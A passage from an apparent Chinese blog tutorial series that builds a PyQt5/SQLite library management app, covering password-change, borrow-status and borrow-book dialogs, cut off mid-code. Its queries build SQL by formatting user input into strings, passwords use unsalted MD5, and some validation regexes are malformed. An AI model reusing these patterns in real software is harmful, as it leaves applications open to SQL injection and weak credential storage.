PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import *</span><br><span class="line">from PyQt5.QtCore import *</span><br><span class="line">import qdarkstyle</span><br><span class="line">import time</span><br><span class="line">from PyQt5.QtSql import *</span><br><span class="line">import hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class changePasswordDialog(QDialog):</span><br><span class="line">    def __init__(self, parent&#x3D;None):</span><br><span class="line">        super(changePasswordDialog, self).__init__(parent)</span><br><span class="line">        self.setWindowModality(Qt.WindowModal)</span><br><span class="line">        self.setWindowTitle(&quot;修改密码&quot;)</span><br><span class="line">        self.setUpUI()</span><br><span class="line"></span><br><span class="line">    def setUpUI(self):</span><br><span class="line">        self.resize(300, 280)</span><br><span class="line">        self.layout &#x3D; QFormLayout()</span><br><span class="line">        self.setLayout(self.layout)</span><br><span class="line"></span><br><span class="line">        self.titlelabel &#x3D; QLabel(&quot; 修改密码&quot;)</span><br><span class="line">        self.studentIdLabel &#x3D; QLabel(&quot;学    号：&quot;)</span><br><span class="line">        # self.studentNameLabel&#x3D;QLabel(&quot;姓    名：&quot;)</span><br><span class="line">        self.oldPasswordLabel &#x3D; QLabel(&quot;旧 密 码：&quot;)</span><br><span class="line">        self.passwordLabel &#x3D; QLabel(&quot;新 密 码：&quot;)</span><br><span class="line">        self.confirmPasswordLabel &#x3D; QLabel(&quot;确认密码：&quot;)</span><br><span class="line"></span><br><span class="line">        self.studentIdEdit &#x3D; QLineEdit()</span><br><span class="line">        # self.studentNameEdit&#x3D;QLineEdit()</span><br><span class="line">        self.oldPasswordEdit &#x3D; QLineEdit()</span><br><span class="line">        self.passwordEdit &#x3D; QLineEdit()</span><br><span class="line">        self.confirmPasswordEdit &#x3D; QLineEdit()</span><br><span class="line"></span><br><span class="line">        self.changePasswordButton &#x3D; QPushButton(&quot;确认修改&quot;)</span><br><span class="line">        self.changePasswordButton.setFixedWidth(140)</span><br><span class="line">        self.changePasswordButton.setFixedHeight(32)</span><br><span class="line"></span><br><span class="line">        self.layout.addRow(&quot;&quot;, self.titlelabel)</span><br><span class="line">        self.layout.addRow(self.studentIdLabel, self.studentIdEdit)</span><br><span class="line">        # self.layout.addRow(self.studentNameLabel,self.studentNameEdit)</span><br><span class="line">        self.layout.addRow(self.oldPasswordLabel, self.oldPasswordEdit)</span><br><span class="line">        self.layout.addRow(self.passwordLabel, self.passwordEdit)</span><br><span class="line">        self.layout.addRow(self.confirmPasswordLabel, self.confirmPasswordEdit)</span><br><span class="line">        self.layout.addRow(&quot;&quot;, self.changePasswordButton)</span><br><span class="line"></span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(20)</span><br><span class="line">        self.titlelabel.setFont(font)</span><br><span class="line">        font.setPixelSize(16)</span><br><span class="line">        self.studentIdLabel.setFont(font)</span><br><span class="line">        # self.studentNameLabel.setFont(font)</span><br><span class="line">        self.oldPasswordLabel.setFont(font)</span><br><span class="line">        self.passwordLabel.setFont(font)</span><br><span class="line">        self.confirmPasswordLabel.setFont(font)</span><br><span class="line"></span><br><span class="line">        font.setPixelSize(16)</span><br><span class="line">        self.studentIdEdit.setFont(font)</span><br><span class="line">        self.changePasswordButton.setFont(font)</span><br><span class="line">        # self.studentNameEdit.setFont(font)</span><br><span class="line">        font.setPixelSize(10)</span><br><span class="line">        self.oldPasswordEdit.setFont(font)</span><br><span class="line">        self.passwordEdit.setFont(font)</span><br><span class="line">        self.confirmPasswordEdit.setFont(font)</span><br><span class="line"></span><br><span class="line">        self.titlelabel.setMargin(8)</span><br><span class="line">        self.layout.setVerticalSpacing(10)</span><br><span class="line"></span><br><span class="line">        # 设置长度</span><br><span class="line">        self.studentIdEdit.setMaxLength(10)</span><br><span class="line">        self.oldPasswordEdit.setMaxLength(16)</span><br><span class="line">        self.passwordEdit.setMaxLength(16)</span><br><span class="line">        self.confirmPasswordEdit.setMaxLength(16)</span><br><span class="line">        # 设置密码掩膜</span><br><span class="line">        self.oldPasswordEdit.setEchoMode(QLineEdit.Password)</span><br><span class="line">        self.passwordEdit.setEchoMode(QLineEdit.Password)</span><br><span class="line">        self.confirmPasswordEdit.setEchoMode(QLineEdit.Password)</span><br><span class="line"></span><br><span class="line">        # 设置校验</span><br><span class="line">        reg &#x3D; QRegExp(&quot;PB[0~9]&#123;8&#125;&quot;)</span><br><span class="line">        pValidator &#x3D; QRegExpValidator(self)</span><br><span class="line">        pValidator.setRegExp(reg)</span><br><span class="line">        self.studentIdEdit.setValidator(pValidator)</span><br><span class="line"></span><br><span class="line">        reg &#x3D; QRegExp(&quot;[a-zA-z0-9]+$&quot;)</span><br><span class="line">        pValidator.setRegExp(reg)</span><br><span class="line">        self.oldPasswordEdit.setValidator(pValidator)</span><br><span class="line">        self.passwordEdit.setValidator(pValidator)</span><br><span class="line">        self.confirmPasswordEdit.setValidator(pValidator)</span><br><span class="line"></span><br><span class="line">        # 设置信号与槽</span><br><span class="line">        self.changePasswordButton.clicked.connect(self.changePasswordButtonClicked)</span><br><span class="line"></span><br><span class="line">    def changePasswordButtonClicked(self):</span><br><span class="line">        studentId &#x3D; self.studentIdEdit.text()</span><br><span class="line">        oldPassword &#x3D; self.oldPasswordEdit.text()</span><br><span class="line">        password &#x3D; self.passwordEdit.text()</span><br><span class="line">        confirmPassword &#x3D; self.confirmPasswordEdit.text()</span><br><span class="line">        if (studentId &#x3D;&#x3D; &quot;&quot; or oldPassword &#x3D;&#x3D; &quot;&quot; or password &#x3D;&#x3D; &quot;&quot; or confirmPassword &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            print(QMessageBox.warning(self, &quot;警告&quot;, &quot;输入不可为空，请重新输入&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            return</span><br><span class="line">        db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">        db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">        db.open()</span><br><span class="line">        query &#x3D; QSqlQuery()</span><br><span class="line">        sql &#x3D; &quot;SELECT * FROM User WHERE StudentId&#x3D;&#39;%s&#39;&quot; % studentId</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        # 如果用户不存在</span><br><span class="line">        if (not query.next()):</span><br><span class="line">            print(QMessageBox.warning(self, &quot;警告&quot;, &quot;该用户不存在，请重新输入&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            self.studentIdEdit.clear()</span><br><span class="line">            return</span><br><span class="line">            # 如果密码错误</span><br><span class="line">        hl &#x3D; hashlib.md5()</span><br><span class="line">        hl.update(oldPassword.encode(encoding&#x3D;&#39;utf-8&#39;))</span><br><span class="line">        md5password &#x3D; hl.hexdigest()</span><br><span class="line">        sql &#x3D; &quot;SELECT * FROM User WHERE Password&#x3D;&#39;%s&#39; AND StudentId&#x3D;&#39;%s&#39;&quot; %(md5password,studentId)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        if (not query.next()):</span><br><span class="line">            print(QMessageBox.warning(self, &quot;警告&quot;, &quot;原密码输入错误,请重新输入&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            self.oldPasswordEdit.clear()</span><br><span class="line">            return</span><br><span class="line">        # 密码与确认密码不同</span><br><span class="line">        if(password!&#x3D;confirmPassword):</span><br><span class="line">            print(QMessageBox.warning(self,&quot;警告&quot;,&quot;两次输入密码不同,请确认输入&quot;,QMessageBox.Yes,QMessageBox.Yes))</span><br><span class="line">            self.passwordEdit.clear()</span><br><span class="line">            self.confirmPasswordEdit.clear()</span><br><span class="line">            return</span><br><span class="line">        # 修改密码</span><br><span class="line">        hl &#x3D; hashlib.md5()</span><br><span class="line">        hl.update(password.encode(encoding&#x3D;&#39;utf-8&#39;))</span><br><span class="line">        md5password &#x3D; hl.hexdigest()</span><br><span class="line">        sql&#x3D;&quot;UPDATE User SET Password&#x3D;&#39;%s&#39; WHERE StudentId&#x3D;&#39;%s&#39;&quot;%(md5password,studentId)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        db.commit()</span><br><span class="line">        QMessageBox.information(self,&quot;提醒&quot;,&quot;修改密码成功，请登录系统!&quot;,QMessageBox.Yes,QMessageBox.Yes)</span><br><span class="line">        self.close()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; changePasswordDialog()</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><h3><span id="pshi-xian-xiao-guo">实现效果</span><a href="#pshi-xian-xiao-guo" class="header-anchor">#</a></h3><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb9hdmznij308e08rq2u.jpg" alt="这里写图片描述"><br><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb9hd0pdgj308d08s3yj.jpg" alt="这里写图片描述"></p><h2><span id="pzui-hou-fu-shang-lian-jie">最后附上链接</span><a href="#pzui-hou-fu-shang-lian-jie" class="header-anchor">#</a></h2><p>项目地址：<a href="https://github.com/ycdxsb/LibraryManageDesktopApp" target="_blank" rel="noopener">github仓库链接</a></p>]]></content>
      <categories>
        <category>PyQt5</category>
        <category>图书馆管理系统</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5搭建图书馆管理系统（9）——借阅状态查询</title>
    <url>/5ec72e4f.html</url>
    <content><![CDATA[<h2><span id="pfen-xi">分析</span><a href="#pfen-xi" class="header-anchor">#</a></h2><p>这个可以说是实现的最简单的一个功能了，只需要结合一下<code>QTableView</code>和<code>QSqlQueryModel</code>对<code>User_Book</code>表和<code>Book</code>表做一个联查即可，直接贴上代码如下</p><a id="more"></a><h2><span id="pdai-ma">代码</span><a href="#pdai-ma" class="header-anchor">#</a></h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import *</span><br><span class="line">from PyQt5.QtCore import Qt</span><br><span class="line">import qdarkstyle</span><br><span class="line">from PyQt5.QtSql import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class BorrowStatusViewer(QWidget):</span><br><span class="line">    def __init__(self, studentId):</span><br><span class="line">        super(BorrowStatusViewer, self).__init__()</span><br><span class="line">        self.resize(700, 500)</span><br><span class="line">        self.studentId &#x3D; studentId</span><br><span class="line">        self.setWindowTitle(&quot;欢迎使用图书馆管理系统&quot;)</span><br><span class="line">        self.setUpUI()</span><br><span class="line"></span><br><span class="line">    def setUpUI(self):</span><br><span class="line">        self.db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">        self.db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">        self.db.open()</span><br><span class="line">        # 分为两块，上方是已借未归还书，下方是已归还书</span><br><span class="line">        self.layout &#x3D; QVBoxLayout(self)</span><br><span class="line">        # Label设置</span><br><span class="line">        self.borrowedLabel &#x3D; QLabel(&quot;未归还:&quot;)</span><br><span class="line">        self.returnedLabel &#x3D; QLabel(&quot;已归还:&quot;)</span><br><span class="line">        self.borrowedLabel.setFixedHeight(32)</span><br><span class="line">        self.borrowedLabel.setFixedWidth(60)</span><br><span class="line">        self.returnedLabel.setFixedHeight(32)</span><br><span class="line">        self.returnedLabel.setFixedWidth(60)</span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(18)</span><br><span class="line">        self.borrowedLabel.setFont(font)</span><br><span class="line">        self.returnedLabel.setFont(font)</span><br><span class="line"></span><br><span class="line">        # Table和Model</span><br><span class="line">        self.borrowedTableView &#x3D; QTableView()</span><br><span class="line">        self.borrowedTableView.horizontalHeader().setStretchLastSection(True)</span><br><span class="line">        self.borrowedTableView.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)</span><br><span class="line">        self.borrowedTableView.setEditTriggers(QAbstractItemView.NoEditTriggers)</span><br><span class="line">        self.returnedTableView &#x3D; QTableView()</span><br><span class="line">        self.returnedTableView.horizontalHeader().setStretchLastSection(True)</span><br><span class="line">        self.returnedTableView.horizontalHeader().setSectionResizeMode(QHeaderView.Stretch)</span><br><span class="line">        self.returnedTableView.setEditTriggers(QAbstractItemView.NoEditTriggers)</span><br><span class="line"></span><br><span class="line">        self.borrowedQueryModel &#x3D; QSqlQueryModel()</span><br><span class="line">        self.returnedQueryModel &#x3D; QSqlQueryModel()</span><br><span class="line">        self.borrowedTableView.setModel(self.borrowedQueryModel)</span><br><span class="line">        self.returnedTableView.setModel(self.returnedQueryModel)</span><br><span class="line">        self.borrowedQuery()</span><br><span class="line">        self.borrowedQueryModel.setHeaderData(0, Qt.Horizontal, &quot;书名&quot;)</span><br><span class="line">        self.borrowedQueryModel.setHeaderData(1, Qt.Horizontal, &quot;书号&quot;)</span><br><span class="line">        self.borrowedQueryModel.setHeaderData(2, Qt.Horizontal, &quot;作者&quot;)</span><br><span class="line">        self.borrowedQueryModel.setHeaderData(3, Qt.Horizontal, &quot;分类&quot;)</span><br><span class="line">        self.borrowedQueryModel.setHeaderData(4, Qt.Horizontal, &quot;出版社&quot;)</span><br><span class="line">        self.borrowedQueryModel.setHeaderData(5, Qt.Horizontal, &quot;出版时间&quot;)</span><br><span class="line">        self.borrowedQueryModel.setHeaderData(6, Qt.Horizontal, &quot;借出时间&quot;)</span><br><span class="line"></span><br><span class="line">        self.returnedQuery()</span><br><span class="line">        self.returnedQueryModel.setHeaderData(0, Qt.Horizontal, &quot;书名&quot;)</span><br><span class="line">        self.returnedQueryModel.setHeaderData(1, Qt.Horizontal, &quot;书号&quot;)</span><br><span class="line">        self.returnedQueryModel.setHeaderData(2, Qt.Horizontal, &quot;作者&quot;)</span><br><span class="line">        self.returnedQueryModel.setHeaderData(3, Qt.Horizontal, &quot;分类&quot;)</span><br><span class="line">        self.returnedQueryModel.setHeaderData(4, Qt.Horizontal, &quot;出版社&quot;)</span><br><span class="line">        self.returnedQueryModel.setHeaderData(5, Qt.Horizontal, &quot;出版时间&quot;)</span><br><span class="line">        self.returnedQueryModel.setHeaderData(6, Qt.Horizontal, &quot;借阅时间&quot;)</span><br><span class="line">        self.returnedQueryModel.setHeaderData(7, Qt.Horizontal, &quot;归还时间&quot;)</span><br><span class="line"></span><br><span class="line">        self.layout.addWidget(self.borrowedLabel)</span><br><span class="line">        self.layout.addWidget(self.borrowedTableView)</span><br><span class="line">        self.layout.addWidget(self.returnedLabel)</span><br><span class="line">        self.layout.addWidget(self.returnedTableView)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def borrowedQuery(self):</span><br><span class="line">        sql &#x3D; &quot;SELECT Book.BookName,Book.BookId,Auth,Category,Publisher,PublishTime,BorrowTime  FROM Book,User_Book WHERE Book.BookId&#x3D;User_Book.BookId AND User_Book.BorrowState&#x3D;1 AND StudentId&#x3D;&#39;%s&#39;&quot; % self.studentId</span><br><span class="line">        self.borrowedQueryModel.setQuery(sql)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def returnedQuery(self):</span><br><span class="line">        sql &#x3D; &quot;SELECT Book.BookName,Book.BookId,Auth,Category,Publisher,PublishTime,BorrowTime,ReturnTime  FROM Book,User_Book WHERE Book.BookId&#x3D;User_Book.BookId AND User_Book.BorrowState&#x3D;0 AND StudentId&#x3D;&#39;%s&#39;&quot; % self.studentId</span><br><span class="line">        self.returnedQueryModel.setQuery(sql)</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app &#x3D; QApplication(sys.argv)</span><br><span class="line">    app.setWindowIcon(QIcon(&quot;.&#x2F;images&#x2F;MainWindow_1.png&quot;))</span><br><span class="line">    app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5())</span><br><span class="line">    mainMindow &#x3D; BorrowStatusViewer(&quot;PB15000135&quot;)</span><br><span class="line">    mainMindow.show()</span><br><span class="line">    sys.exit(app.exec_())</span><br></pre></td></tr></table></figure><h2><span id="pshi-xian-xiao-guo">实现效果</span><a href="#pshi-xian-xiao-guo" class="header-anchor">#</a></h2><p><img src="https://tva1.sinaimg.cn/large/00831rSTly1gdb9e92wkxj30jl0etaan.jpg" alt="Alt text"></p><h2><span id="pzui-hou-fu-shang-lian-jie">最后附上链接</span><a href="#pzui-hou-fu-shang-lian-jie" class="header-anchor">#</a></h2><p>项目地址：<a href="https://github.com/ycdxsb/LibraryManageDesktopApp" target="_blank" rel="noopener">github仓库链接</a></p>]]></content>
      <categories>
        <category>PyQt5</category>
        <category>图书馆管理系统</category>
      </categories>
      <tags>
        <tag>PyQt5</tag>
        <tag>数据库</tag>
      </tags>
  </entry>
  <entry>
    <title>PyQt5搭建图书馆管理系统（8）——借书/还书功能</title>
    <url>/8effeb9b.html</url>
    <content><![CDATA[<h2><span id="pjie-shu-gong-neng-shi-xian">借书功能实现</span><a href="#pjie-shu-gong-neng-shi-xian" class="header-anchor">#</a></h2><h3><span id="pfen-xi">分析</span><a href="#pfen-xi" class="header-anchor">#</a></h3><p>本来借书的信息都是应该有RFID识别得到的，但是作为大作业，只能让用户输入信息了，但是书名之类的都不唯一，所以采取了与淘汰书籍一样的操作——让用户输入书号，自动匹配书本信息，然后确认借阅</p><p>借阅时，需要处理的逻辑如下：</p><ul><li>用户输入的书号存在，就匹配信息给用户</li><li>不存在就点击借阅，给出警告</li><li>借阅书籍数已经达到上限5本 ，给出警告</li><li>不允许借阅同样的书</li><li>更新<code>Book</code>表信息的借阅次数，剩余可借阅书数</li><li>在<code>User_Book</code>表插入记录</li><li>借阅成功给出提示</li></ul><a id="more"></a><h3><span id="pdai-ma-shi-xian">代码实现</span><a href="#pdai-ma-shi-xian" class="header-anchor">#</a></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys</span><br><span class="line">from PyQt5.QtWidgets import *</span><br><span class="line">from PyQt5.QtGui import *</span><br><span class="line">from PyQt5.QtCore import *</span><br><span class="line">import qdarkstyle</span><br><span class="line">import time</span><br><span class="line">from PyQt5.QtSql import *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class borrowBookDialog(QDialog):</span><br><span class="line">    borrow_book_success_signal &#x3D; pyqtSignal()</span><br><span class="line"></span><br><span class="line">    def __init__(self, StudentId, parent&#x3D;None):</span><br><span class="line">        super(borrowBookDialog, self).__init__(parent)</span><br><span class="line">        self.studentId &#x3D; StudentId</span><br><span class="line">        self.setUpUI()</span><br><span class="line">        self.setWindowModality(Qt.WindowModal)</span><br><span class="line">        self.setWindowTitle(&quot;借阅书籍&quot;)</span><br><span class="line"></span><br><span class="line">    def setUpUI(self):</span><br><span class="line">        # 书名，书号，作者，分类，添加数量.出版社,出版日期</span><br><span class="line">        # 书籍分类：哲学类、社会科学类、政治类、法律类、军事类、经济类、文化类、教育类、体育类、语言文字类、艺术类、历史类、地理类、天文学类、生物学类、医学卫生类、农业类</span><br><span class="line">        BookCategory &#x3D; [&quot;哲学&quot;, &quot;社会科学&quot;, &quot;政治&quot;, &quot;法律&quot;, &quot;军事&quot;, &quot;经济&quot;, &quot;文化&quot;, &quot;教育&quot;, &quot;体育&quot;, &quot;语言文字&quot;, &quot;艺术&quot;, &quot;历史&quot;</span><br><span class="line">            , &quot;地理&quot;, &quot;天文学&quot;, &quot;生物学&quot;, &quot;医学卫生&quot;, &quot;农业&quot;]</span><br><span class="line">        self.resize(300, 400)</span><br><span class="line">        self.layout &#x3D; QFormLayout()</span><br><span class="line">        self.setLayout(self.layout)</span><br><span class="line"></span><br><span class="line">        # Label控件</span><br><span class="line">        self.borrowStudentLabel &#x3D; QLabel(&quot;借 阅 人:&quot;)</span><br><span class="line">        self.borrowStudentIdLabel &#x3D; QLabel(self.studentId)</span><br><span class="line">        self.titlelabel &#x3D; QLabel(&quot;  借阅书籍&quot;)</span><br><span class="line">        self.bookNameLabel &#x3D; QLabel(&quot;书    名:&quot;)</span><br><span class="line">        self.bookIdLabel &#x3D; QLabel(&quot;书    号:&quot;)</span><br><span class="line">        self.authNameLabel &#x3D; QLabel(&quot;作    者:&quot;)</span><br><span class="line">        self.categoryLabel &#x3D; QLabel(&quot;分    类:&quot;)</span><br><span class="line">        self.publisherLabel &#x3D; QLabel(&quot;出 版 社:&quot;)</span><br><span class="line">        self.publishDateLabel &#x3D; QLabel(&quot;出版日期:&quot;)</span><br><span class="line"></span><br><span class="line">        # button控件</span><br><span class="line">        self.borrowBookButton &#x3D; QPushButton(&quot;确认借阅&quot;)</span><br><span class="line"></span><br><span class="line">        # lineEdit控件</span><br><span class="line">        self.bookNameEdit &#x3D; QLineEdit()</span><br><span class="line">        self.bookIdEdit &#x3D; QLineEdit()</span><br><span class="line">        self.authNameEdit &#x3D; QLineEdit()</span><br><span class="line">        self.categoryComboBox &#x3D; QComboBox()</span><br><span class="line">        self.categoryComboBox.addItems(BookCategory)</span><br><span class="line">        self.publisherEdit &#x3D; QLineEdit()</span><br><span class="line">        self.publishTime &#x3D; QLineEdit()</span><br><span class="line"></span><br><span class="line">        self.bookNameEdit.setMaxLength(10)</span><br><span class="line">        self.bookIdEdit.setMaxLength(6)</span><br><span class="line">        self.authNameEdit.setMaxLength(10)</span><br><span class="line">        self.publisherEdit.setMaxLength(10)</span><br><span class="line"></span><br><span class="line">        # 添加进formlayout</span><br><span class="line">        self.layout.addRow(&quot;&quot;, self.titlelabel)</span><br><span class="line">        self.layout.addRow(self.borrowStudentLabel, self.borrowStudentIdLabel)</span><br><span class="line">        self.layout.addRow(self.bookNameLabel, self.bookNameEdit)</span><br><span class="line">        self.layout.addRow(self.bookIdLabel, self.bookIdEdit)</span><br><span class="line">        self.layout.addRow(self.authNameLabel, self.authNameEdit)</span><br><span class="line">        self.layout.addRow(self.categoryLabel, self.categoryComboBox)</span><br><span class="line">        self.layout.addRow(self.publisherLabel, self.publisherEdit)</span><br><span class="line">        self.layout.addRow(self.publishDateLabel, self.publishTime)</span><br><span class="line">        self.layout.addRow(&quot;&quot;, self.borrowBookButton)</span><br><span class="line"></span><br><span class="line">        # 设置字体</span><br><span class="line">        font &#x3D; QFont()</span><br><span class="line">        font.setPixelSize(20)</span><br><span class="line">        self.titlelabel.setFont(font)</span><br><span class="line">        font.setPixelSize(16)</span><br><span class="line">        self.borrowStudentIdLabel.setFont(font)</span><br><span class="line">        font.setPixelSize(14)</span><br><span class="line">        self.borrowStudentLabel.setFont(font)</span><br><span class="line">        self.bookNameLabel.setFont(font)</span><br><span class="line">        self.bookIdLabel.setFont(font)</span><br><span class="line">        self.authNameLabel.setFont(font)</span><br><span class="line">        self.categoryLabel.setFont(font)</span><br><span class="line">        self.publisherLabel.setFont(font)</span><br><span class="line">        self.publishDateLabel.setFont(font)</span><br><span class="line"></span><br><span class="line">        self.bookNameEdit.setFont(font)</span><br><span class="line">        self.bookNameEdit.setReadOnly(True)</span><br><span class="line">        self.bookNameEdit.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.bookIdEdit.setFont(font)</span><br><span class="line">        self.authNameEdit.setFont(font)</span><br><span class="line">        self.authNameEdit.setReadOnly(True)</span><br><span class="line">        self.authNameEdit.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.publisherEdit.setFont(font)</span><br><span class="line">        self.publisherEdit.setReadOnly(True)</span><br><span class="line">        self.publisherEdit.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.publishTime.setFont(font)</span><br><span class="line">        self.publishTime.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line">        self.categoryComboBox.setFont(font)</span><br><span class="line">        self.categoryComboBox.setStyleSheet(&quot;background-color:#363636&quot;)</span><br><span class="line"></span><br><span class="line">        # button设置</span><br><span class="line">        font.setPixelSize(16)</span><br><span class="line">        self.borrowBookButton.setFont(font)</span><br><span class="line">        self.borrowBookButton.setFixedHeight(32)</span><br><span class="line">        self.borrowBookButton.setFixedWidth(140)</span><br><span class="line"></span><br><span class="line">        # 设置间距</span><br><span class="line">        self.titlelabel.setMargin(8)</span><br><span class="line">        self.layout.setVerticalSpacing(10)</span><br><span class="line">        self.borrowBookButton.clicked.connect(self.borrowButtonClicked)</span><br><span class="line">        self.bookIdEdit.textChanged.connect(self.bookIdEditChanged)</span><br><span class="line">        self.bookIdEdit.returnPressed.connect(self.borrowButtonClicked)</span><br><span class="line"></span><br><span class="line">    def borrowButtonClicked(self):</span><br><span class="line">        # 获取书号，书号为空或不存在库中，则弹出错误</span><br><span class="line">        # 向Book_User表插入记录，更新User表以及Book表</span><br><span class="line">        BookId &#x3D; self.bookIdEdit.text()</span><br><span class="line">        # BookId为空的处理</span><br><span class="line">        if (BookId &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            print(QMessageBox.warning(self, &quot;警告&quot;, &quot;你所要借的书不存在，请查看输入&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            return</span><br><span class="line">        # 打开数据库</span><br><span class="line">        db &#x3D; db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">        db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">        db.open()</span><br><span class="line">        query &#x3D; QSqlQuery()</span><br><span class="line">        # 如果BookId不存在</span><br><span class="line">        sql &#x3D; &quot;SELECT * FROM Book WHERE BookId&#x3D;&#39;%s&#39;&quot; % BookId</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        if (not query.next()):</span><br><span class="line">            print(QMessageBox.warning(self, &quot;警告&quot;, &quot;你所要借的书不存在，请查看输入&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">            return</span><br><span class="line"></span><br><span class="line">        # 借书上限5本</span><br><span class="line">        sql &#x3D; &quot;SELECT COUNT(StudentId) FROM User_Book WHERE StudentId&#x3D;&#39;%s&#39; AND BorrowState&#x3D;1&quot; % (</span><br><span class="line">            self.studentId)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        if (query.next()):</span><br><span class="line">            borrowNum &#x3D; query.value(0)</span><br><span class="line">            if (borrowNum &#x3D;&#x3D; 5):</span><br><span class="line">                QMessageBox.warning(self, &quot;警告&quot;, &quot;您借阅的书达到上限（5本）,借书失败！&quot;, QMessageBox.Yes, QMessageBox.Yes)</span><br><span class="line">                return</span><br><span class="line">        # 不允许重复借书</span><br><span class="line">        sql &#x3D; &quot;SELECT COUNT(StudentId) FROM User_Book WHERE  StudentId&#x3D;&#39;%s&#39; AND BookId&#x3D;&#39;%s&#39; AND BorrowState&#x3D;1&quot; % (</span><br><span class="line">        self.studentId, BookId)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        if (query.next() and query.value(0)):</span><br><span class="line">            QMessageBox.warning(self, &quot;警告&quot;, &quot;您已经借阅了本书并尚未归还，借阅失败！&quot;, QMessageBox.Yes, QMessageBox.Yes)</span><br><span class="line">            return</span><br><span class="line">        # 更新User表</span><br><span class="line">        sql &#x3D; &quot;UPDATE User SET TimesBorrowed&#x3D;TimesBorrowed+1,NumBorrowed&#x3D;NumBorrowed+1 WHERE StudentId&#x3D;&#39;%s&#39;&quot; % self.studentId</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        db.commit()</span><br><span class="line">        # 更新Book表</span><br><span class="line">        sql &#x3D; &quot;UPDATE Book SET NumCanBorrow&#x3D;NumCanBorrow-1,NumBorrowed&#x3D;NumBorrowed+1 WHERE BookId&#x3D;&#39;%s&#39;&quot; % BookId</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        db.commit()</span><br><span class="line">        # 插入User_Book表</span><br><span class="line">        timenow &#x3D; time.strftime(&#39;%Y-%m-%d&#39;, time.localtime(time.time()))</span><br><span class="line">        sql &#x3D; &quot;INSERT INTO User_Book VALUES (&#39;%s&#39;,&#39;%s&#39;,&#39;%s&#39;,NULL,1)&quot; % (self.studentId, BookId, timenow)</span><br><span class="line">        print(sql)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        db.commit()</span><br><span class="line">        print(QMessageBox.information(self, &quot;提示&quot;, &quot;借阅成功!&quot;, QMessageBox.Yes, QMessageBox.Yes))</span><br><span class="line">        self.borrow_book_success_signal.emit()</span><br><span class="line">        self.close()</span><br><span class="line">        return</span><br><span class="line"></span><br><span class="line">    def bookIdEditChanged(self):</span><br><span class="line">        bookId &#x3D; self.bookIdEdit.text()</span><br><span class="line">        if (bookId &#x3D;&#x3D; &quot;&quot;):</span><br><span class="line">            self.bookNameEdit.clear()</span><br><span class="line">            self.publisherEdit.clear()</span><br><span class="line">            self.authNameEdit.clear()</span><br><span class="line">            self.publishTime.clear()</span><br><span class="line">        db &#x3D; QSqlDatabase.addDatabase(&quot;QSQLITE&quot;)</span><br><span class="line">        db.setDatabaseName(&#39;.&#x2F;db&#x2F;LibraryManagement.db&#39;)</span><br><span class="line">        db.open()</span><br><span class="line">        query &#x3D; QSqlQuery()</span><br><span class="line">        sql &#x3D; &quot;SELECT * FROM Book WHERE BookId&#x3D;&#39;%s&#39;&quot; % (bookId)</span><br><span class="line">        query.exec_(sql)</span><br><span class="line">        # 查询对应书号，如果存在就更新form</span><br><span class="line">        if (query.next()):</span><br><span class="line">            self.bookNameEdit.setText(query.value(0))</span><br><span class="line">           